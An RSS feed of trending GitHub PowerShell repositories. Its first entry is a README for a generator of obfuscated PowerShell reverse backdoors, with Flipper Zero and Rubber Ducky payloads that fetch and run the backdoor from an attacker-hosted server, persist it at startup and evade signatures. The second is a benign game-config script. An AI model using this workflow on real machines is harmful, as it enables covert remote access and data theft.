<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-02-14T01:45:19Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Drew-Alleman/powershell-backdoor-generator</title>
    <updated>2023-02-14T01:45:19Z</updated>
    <id>tag:github.com,2023-02-14:/Drew-Alleman/powershell-backdoor-generator</id>
    <link href="https://github.com/Drew-Alleman/powershell-backdoor-generator" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Obfuscated powershell reverse backdoor with Flipper Zero and USB Rubber Ducky payloads&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;powershell-backdoor&lt;/h1&gt; &#xA;&lt;p&gt;Reverse backdoor written in Powershell and obfuscated with Python. Allowing the backdoor to have a new signature after every run. Also can generate auto run scripts for Flipper Zero and USB Rubber Ducky.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;usage: listen.py [-h] [--ip-address IP_ADDRESS] [--port PORT] [--random] [--out OUT] [--verbose] [--delay DELAY] [--flipper FLIPPER] [--ducky]&#xA;                 [--server-port SERVER_PORT] [--payload PAYLOAD] [--list--payloads] [-k KEYBOARD] [-L] [-H]&#xA;&#xA;Powershell Backdoor Generator&#xA;&#xA;options:&#xA;  -h, --help            show this help message and exit&#xA;  --ip-address IP_ADDRESS, -i IP_ADDRESS&#xA;                        IP Address to bind the backdoor too (default: 192.168.X.XX)&#xA;  --port PORT, -p PORT  Port for the backdoor to connect over (default: 4444)&#xA;  --random, -r          Randomizes the outputed backdoor&#39;s file name&#xA;  --out OUT, -o OUT     Specify the backdoor filename (relative file names)&#xA;  --verbose, -v         Show verbose output&#xA;  --delay DELAY         Delay in milliseconds before Flipper Zero/Ducky-Script payload execution (default:100)&#xA;  --flipper FLIPPER     Payload file for flipper zero (includes EOL conversion) (relative file name)&#xA;  --ducky               Creates an inject.bin for the http server&#xA;  --server-port SERVER_PORT&#xA;                        Port to run the HTTP server on (--server) (default: 8080)&#xA;  --payload PAYLOAD     USB Rubber Ducky/Flipper Zero backdoor payload to execute&#xA;  --list--payloads      List all available payloads&#xA;  -k KEYBOARD, --keyboard KEYBOARD&#xA;                        Keyboard layout for Bad Usb/Flipper Zero (default: us)&#xA;  -A, --actually-listen&#xA;                        Just listen for any backdoor connections&#xA;  -H, --listen-and-host&#xA;                        Just listen for any backdoor connections and host the backdoor directory&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Quick Links&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Drew-Alleman/powershell-backdoor-generator/main/#preview&#34;&gt;Preview&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Drew-Alleman/powershell-backdoor-generator/main/#features&#34;&gt;Features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Drew-Alleman/powershell-backdoor-generator/main/#standard-backdoor&#34;&gt;Standard Backdoor&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Drew-Alleman/powershell-backdoor-generator/main/#flipper-zero-backdoor&#34;&gt;Flipper Zero Backdoor&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Drew-Alleman/powershell-backdoor-generator/main/#usb-rubber-ducky-backdoor&#34;&gt;USB Rubber Ducky Backdoor&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Drew-Alleman/powershell-backdoor-generator/main/#thanks&#34;&gt;Thanks&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Drew-Alleman/powershell-backdoor-generator/main/#to-do&#34;&gt;To Do&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Preview&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Drew-Alleman/powershell-backdoor-generator/main/images/preview.PNG&#34; alt=&#34;preview&#34;&gt; &lt;br&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hak5 Rubber Ducky payload&lt;/li&gt; &#xA; &lt;li&gt;Flipper Zero payload&lt;/li&gt; &#xA; &lt;li&gt;Download Files from remote system&lt;/li&gt; &#xA; &lt;li&gt;Fetch target computers public IP address&lt;/li&gt; &#xA; &lt;li&gt;List local users&lt;/li&gt; &#xA; &lt;li&gt;Find Intresting Files&lt;/li&gt; &#xA; &lt;li&gt;Get OS Information&lt;/li&gt; &#xA; &lt;li&gt;Get BIOS Information&lt;/li&gt; &#xA; &lt;li&gt;Get Anti-Virus Status&lt;/li&gt; &#xA; &lt;li&gt;Get Active TCP Clients&lt;/li&gt; &#xA; &lt;li&gt;Checks for common pentesting software installed&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Standard backdoor&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;C:\Users\DrewQ\Desktop\powershell-backdoor-main&amp;gt; python .\listen.py --verbose&#xA;[*] Encoding backdoor script&#xA;[*] Saved backdoor backdoor.ps1 sha1:32b9ca5c3cd088323da7aed161a788709d171b71&#xA;[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A file in the current working directory will be created called backdoor.ps1&lt;/p&gt; &#xA;&lt;h1&gt;Bad USB/ USB Rubber Ducky attacks&lt;/h1&gt; &#xA;&lt;p&gt;When using any of these attacks you will be opening up a HTTP server hosting the backdoor. Once the backdoor is retrieved the HTTP server will be shutdown.&lt;/p&gt; &#xA;&lt;h2&gt;Payloads&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Execute -- Execute the backdoor&lt;/li&gt; &#xA; &lt;li&gt;BindAndExecute -- Place the backdoor in temp, bind the backdoor to startup and then execute it.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Flipper Zero Backdoor&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Users\DrewQ\Desktop\powershell-backdoor-main&amp;gt; python .\listen.py --flipper powershell_backdoor.txt --payload execute&#xA;[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1&#xA;[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Place the text file you specified (e.g: powershell_backdoor.txt) into your flipper zero. When the payload is executed it will download and execute backdoor.ps1&lt;/p&gt; &#xA;&lt;h2&gt;Usb Rubber Ducky Backdoor&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt; C:\Users\DrewQ\Desktop\powershell-backdoor-main&amp;gt; python .\listen.py --ducky --payload BindAndExecute&#xA;[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1&#xA;[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A file named inject.bin will be placed in your current working directory. Java is required for this feature. When the payload is executed it will download and execute backdoor.ps1&lt;/p&gt; &#xA;&lt;h2&gt;Thanks&lt;/h2&gt; &#xA;&lt;p&gt;To encode payload.txt into inject.bin for USB Rubber Ducky Attacks I use encoder.jar created by &lt;img src=&#34;https://github.com/midnitesnake&#34; alt=&#34;midnitesnake&#34;&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Backdoor Execution&lt;/h2&gt; &#xA;&lt;p&gt;Tested on Windows 11, Windows 10 and Kali Linux&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;powershell.exe -File backdoor.ps1 -ExecutionPolicy Unrestricted&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;┌──(drew㉿kali)-[/home/drew/Documents]&#xA;└─PS&amp;gt; ./backdoor.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;To Do&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Add Standard Backdoor&lt;/li&gt; &#xA; &lt;li&gt;Find Writeable Directories&lt;/li&gt; &#xA; &lt;li&gt;Get Windows Update Status&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Output of 5 obfuscations/Runs&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;sha1:c7a5fa3e56640ce48dcc3e8d972e444d9cdd2306&#xA;sha1:b32dab7b26cdf6b9548baea6f3cfe5b8f326ceda&#xA;sha1:e49ab36a7ad6b9fc195b4130164a508432f347db&#xA;sha1:ba40fa061a93cf2ac5b6f2480f6aab4979bd211b&#xA;sha1:f2e43320403fb11573178915b7e1f258e7c1b3f0&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>theyetty/update-hogwarts-legacy-engine.ini</title>
    <updated>2023-02-14T01:45:19Z</updated>
    <id>tag:github.com,2023-02-14:/theyetty/update-hogwarts-legacy-engine.ini</id>
    <link href="https://github.com/theyetty/update-hogwarts-legacy-engine.ini" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;This updates the engine.ini for Hogwarts Legacy with some settings defined to help performance&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;Instructions:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Click Download Link&lt;/li&gt; &#xA; &lt;li&gt;Open the Zip file and extract &lt;code&gt;update-hogwarts-legacy-engine.ini-main&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Double click &lt;code&gt;run.bat&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;You may need to allow Defender to run it, by clicking &lt;code&gt;More Info -&amp;gt; Run Anyway&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If all is good it will say Succesfully updated the file &lt;code&gt;C:\Users\%USER%\AppData\Local\Hogwarts Legacy\Saved\Config\WindowsNoEditor\Engine.ini&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Then launch the game and see if its helped or not :)&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;What does the script do exactly?&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;It loads &lt;code&gt;C:\Users\%USER%\AppData\Local\Hogwarts Legacy\Saved\Config\WindowsNoEditor\Engine.ini&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;It loads all the variables under [SystemSettings] if it doesn&#39;t exist it creates it&lt;/li&gt; &#xA; &lt;li&gt;It works out your avaliable vram and saves this information into r.Streaming.PoolSize&lt;/li&gt; &#xA; &lt;li&gt;It then checks all the variables to see if any match the settings I specified at the top of the file&lt;/li&gt; &#xA; &lt;li&gt;If the settings already exist it will remove it and update it with the new value&lt;/li&gt; &#xA; &lt;li&gt;If the settings don&#39;t exist it will add them, it won&#39;t mess with any other settings and is able to add them to the bottom of &lt;code&gt;[SystemSettings]&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>